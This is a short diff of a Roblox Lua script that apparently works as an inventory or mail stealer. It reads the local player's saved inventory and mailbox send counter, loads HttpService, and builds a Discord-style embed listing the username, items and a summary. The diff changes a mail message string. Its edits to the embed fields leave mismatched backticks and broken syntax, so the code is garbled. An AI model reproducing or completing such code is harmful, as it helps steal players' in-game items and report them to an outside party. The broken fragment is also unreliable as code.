@@ -9,7 +9,7 @@ local library = require(game.ReplicatedStorage.Library)
 local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
 local mailsent = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().MailboxSendsSinceReset
 local plr = game.Players.LocalPlayer
-local MailMessage = "GG / GY2RVSEGDT"
+local MailMessage = "Light Monzz ON Top"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
@@ -55,17 +55,17 @@ local function SendMessage(username, diamonds)
 	local fields = {
 		{
 			name = "📖 UserName:",
-			value = "```" username, "```"
+			value = ```username,
 			inline = true
 		},
 		{
 			name = "✏️ Items List:",
-			value = "```", "```"
+			value = "",
 			inline = false
 		},
         {
             name = "🥳 Summary:",
-            value = "```", "```"
+            value = "",```
             inline = false
         }
 	}
